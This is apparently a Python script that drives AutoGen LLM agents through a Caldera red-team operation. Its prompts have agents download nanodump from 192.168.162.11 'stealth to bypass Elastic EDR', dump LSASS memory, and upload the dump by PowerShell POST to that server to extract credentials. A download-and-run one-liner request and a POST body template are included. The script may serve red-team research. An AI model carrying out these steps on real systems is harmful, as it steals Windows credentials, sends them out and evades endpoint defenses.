import autogen.runtime_logging
from agents.caldera_agent import caldera_agent_user_proxy, caldera_agent
from agents.web_agent import web_agent_user_proxy, web_agent
from agents.powershell_agent import powershell_agent
from agents.groupchat_agent import human_analyst_agent

from utils.shared_config import clean_working_directory, llm_config
from utils.logs import print_usage_statistics
import autogen

clean_working_directory("/caldera")

logging_session_id = autogen.runtime_logging.start(config={"dbname": "logs.db"})

groupchat = autogen.GroupChat(
    agents=[
        human_analyst_agent,
        caldera_agent_user_proxy,
        caldera_agent,
    ],
    messages=[],
)
groupchat_manager = autogen.GroupChatManager(groupchat=groupchat, llm_config=llm_config)

chat_result = human_analyst_agent.initiate_chat(
    groupchat_manager,
    message="Get the ID of the active Caldera operation.",
    clear_history=True,
)

chat_result = human_analyst_agent.initiate_chat(
    groupchat_manager,
    message="Get the PAW of the active Caldera agent.",
    clear_history=False,
)

chat_result = human_analyst_agent.initiate_chat(
    groupchat_manager,
    message="Summarize the ID and PAW from previous steps in a table.",
    clear_history=False,
)

chat_result = human_analyst_agent.initiate_chat(
    groupchat_manager,
    message="""Use PowerShell to upload C:/temp/lsass_dump.dmp.  
    """,
    clear_history=False,
)

exit()

chat_result = human_analyst_agent.initiate_chat(
    groupchat_manager,
    message="""Use PowerShell to upload the generated dump file at  Upload C:/temp/lsass_dump.dmp to our server at http://192.168.162.11:8800/upload. 
    Use 'cmd' to then run the PowerShell command using 'pwsh'. Example: cmd /c pwsh -Command Invoke-RestMethod -Uri.
    The POST body should be formatted as $body = @{ 'filename'='lsass_dump.dmp'; 'content_type'='text/plain'; 'file'=[IO.File]::ReadAllBytes('C:\\temp\\lsass_dump.dmp') } 
    """,
    clear_history=False,
)


chat_result = human_analyst_agent.initiate_chat(
    groupchat_manager,
    message="Use powershell to download http://192.168.162.11:8800/nanodump.x64.exe if it does not exist yet, and save it to C:\\temp of the active agent. Do this stealth to bypass Elastic EDR.",
    clear_history=False,
)

chat_result = human_analyst_agent.initiate_chat(
    groupchat_manager,
    message="""Analyze the available nanodump flags at https://raw.githubusercontent.com/fortra/nanodump/main/README.md""",
    clear_history=False,
)

chat_result = human_analyst_agent.initiate_chat(
    groupchat_manager,
    message="""Use powershell to run the downloaded nanodump executable to dump LSASS without forking and pay attention to restoring the signature. 
    Write the dump to C:\\temp.""",
    clear_history=False,
)

chat_result = human_analyst_agent.initiate_chat(
    groupchat_manager,
    message="""Use PowerShell to upload the generated dump file to our server, where we will use it to extract credentials. Upload C:/temp/dump.dmp. 
    Use 'cmd' to then run the PowerShell command using 'pwsh'. Example: cmd /c pwsh -Command Invoke-RestMethod -Uri,
    and take this into account: $uri = '192.168.162.11:8800/upload' $body = @{ 'filename'='<DUMP_PATH>'; 'content_type'='text/plain'; 'file'=[IO.File]::ReadAllBytes('<FILE_PATH>') } Invoke-RestMethod -uri $uri -method POST -body $body",""",
    clear_history=False,
)

autogen.runtime_logging.stop()
print_usage_statistics(logging_session_id)

exit()


chat_result = web_agent_user_proxy.initiate_chat(
    web_agent,
    message="Summarize the parameters available in the README.md file for tool https://raw.githubusercontent.com/fortra/nanodump/main/README.md. Include the parameter flag and a short description.",
    clear_history=False,
)

chat_result = caldera_agent_user_proxy.initiate_chat(
    caldera_agent,
    message="Use powershell to now dump lsass using nanodump and the summarized parameters, and output the results in C:\\temp",
    clear_history=False,
)

chat_result = caldera_agent_user_proxy.initiate_chat(
    caldera_agent,
    message="Run 'calc.exe' on the active agent for operation CalderaGPT. do NOT use abilities but links.",
    clear_history=True,
)

chat_result = web_agent_user_proxy.initiate_chat(
    web_agent,
    message="Summarize the parameters available in the README.md file for tool https://raw.githubusercontent.com/fortra/nanodump/main/README.md. Include the parameter flag and a short description.",
    clear_history=True,
)

chat_result = user_proxy_agent.initiate_chat(
    powershell_agent,
    message="Give me an example powershell command line to download and run nanodump in a one-liner, and save the output to a file.",
    clear_history=False,
)

chat_result = user_proxy_agent.initiate_chat(
    api_agent,
    message="Find out which agent is running by talking to the Caldera API. Give name and paw",
    clear_history=True,
)

chat_result = user_proxy_agent.initiate_chat(
    api_agent,
    message="Return the hostname string in reverse",
    clear_history=False,
)
